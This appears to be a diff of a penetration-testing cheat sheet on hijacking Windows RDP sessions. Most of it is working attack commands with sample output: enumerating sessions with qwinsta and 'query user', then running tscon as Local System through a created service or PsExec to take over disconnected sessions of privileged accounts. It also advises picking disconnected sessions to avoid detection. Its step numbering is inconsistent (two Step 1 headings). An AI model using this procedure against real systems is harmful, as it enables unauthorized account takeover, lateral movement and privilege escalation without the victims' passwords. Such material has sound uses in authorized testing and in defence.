@@ -2,48 +2,77 @@
 Lateral movement with RDP session hijacking
 ========================================================================================================================
 
-During a penetration test, if you gain remote access (with local admin priv) on a target Windows server or workstation, you can hijack (without knowing their password)
-the RDP session of any other user that were logged into the system but are now disconnected. You can also do it with a currently logged user 
-but he will be kick-out of his session and this will be suspicious.
+The objectives of the RDP session hijacking technique is to hijack a legitimate user’s remote desktop session to:
+- move laterally within a Windows environment
+- escalate our privileges by stealing a higher privileged account session (e.g., Domain Admin) 
+
+During a penetration test, if you obtain local administrator privileges over a remote Windows server or workstation, you can use native 
+Windows commands (i.e., 'c:\windows\system32\tscon.exe') to hijack the remote session (RDP) of any user connected or disconnected on the 
+target computer without knowing their password. 
+
+To limit the chance of being detected it is better to only target and hijack disconnected sessions. Indeed, if you hijack an active session 
+(i.e., session of a currently logged user), the victim user will be kick-out of his session and it will be very suspicious.
 
 This technique allows to move laterally by hijacking other user sessions without the need to know their passwords or dump and crack (or PTH)
 their password hashes to impersonate them.
 
 
 ========================================================================================================================
-PoC - RDP session hijacking using TSCON 
+PoC/Basic example - RDP session hijacking using the native Windows command 'TSCON' 
 ========================================================================================================================
 
-Step 1 - We use the account 'auditor' to log into a remote Windows server (using RDP)
---------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------
+Step 1 - Enumerate the remote sessions available on a target Windows server for which you have local admin privileges
+------------------------------------------------------------------------------------------------------------------------
 
-> Note: The account 'auditor' has local admin priv on the remote Windows server
+In this example, we are logged with the domain account 'LAB\auditor' into a Windows laptop (member of the domain 'LAB').
+This account has local admin privileges over the remote Windows server '192.168.50.25' and thus can enumerate the 
+remote sessions available with the native Windows command 'qwinsta'.
+
+PS C:\Users\Auditor> qwinsta /server:192.168.50.25
+
+ SESSIONNAME           USERNAME           ID  STATE      TYPE   DEVICE
+ services                                  0  Disc        
+ console                                   1  Conn
+                       administrator       2  Disc            
+                       HelpdeskSupport     3  Disc            
+ rdp-tcp                               65536  Listen
+
+ > On the remote server there are 2 disconnected sessions:
+  +  the disconnected session ID 2 which belongs to the local account 'administrator'.
+  +  the disconnected session ID 3 which belongs to the the domain account 'HelpdeskSupport'.
+
+The domain account 'LAB\HelpdeskSupport' is a valuable target beacause it is member of the higly privileged domain group "Account Operators".
 
 
-Step 2 - We use the 'query user' command to display the list of available sessions on the remote server
---------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------
+Step 1 - Log into a remote Windows server '192.168.50.25' (RDP) with domain account auditor 'LAB\auditor' 
+------------------------------------------------------------------------------------------------------------------------
+
+Once logged, we can use locally the command 'query user' to confimr the list of available sessions.
+In this example we use the domain account 'LAB\auditor' which has local admin privileges on the remote Windows server.
 
 C:\Users\Auditor> query user
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
->auditor               rdp-tcp#3           1  Active          .  7/27/2022 6:06 PM
- administrator                             2  Disc            .  7/27/2022 6:05 PM
+>auditor               rdp-tcp#3           1  Active          .  11/19/2023 2:06 PM
+ administrator                             2  Disc            .  11/19/2023 2:04 PM
+ HelpdeskSupport                           3  Disc            .  11/18/2023 9:25 PM
  
- > On this server the account 'administrator' has been logged but its session (ID 2) is now disconnected.
 
- 
-Step 3 - We create and execute a service that will execute TSCON with Local System level privileges and will hijack the session of the 'administrator' account
---------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Create & start a service that will execute TSCON with Local System level privileges & will hijack the session of the domain account 'LAB\HelpdeskSupport'
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-C:\Users\Auditor> sc create svcrdpsessionhijack binpath="cmd.exe /k tscon 2 /dest:rdp-tcp#3"
+C:\Users\Auditor> sc create svcrdpsessionhijack binpath="cmd.exe /k tscon 3 /dest:rdp-tcp#3"
 [SC] CreateService SUCCESS
 
 C:\Users\Auditor> net start svcrdpsessionhijack
 
-> We have now full access to the RDP session of the 'administrator' account.
+> We have now full access to the RDP session of the higly privileged account 'LAB\HelpdeskSupport'.
 
-
-Step 3 Bis - We use PsExec to become Local System and then run TSCON to hijack the session of the 'administrator' account
---------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 Bis - Use PsExec to become Local System and then run TSCON to hijack the session of the local 'administrator' account
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\Auditor\Desktop> PsExec64.exe -s -i cmd.exe
 
@@ -53,4 +82,4 @@ Sysinternals - www.sysinternals.com
 
 C:\Windows\system32> tscon 2 /dest:rdp-tcp#3
 
-> We have now full access to the RDP session of the 'administrator' account.
+> We have now full access to the RDP session of the local 'administrator' account.
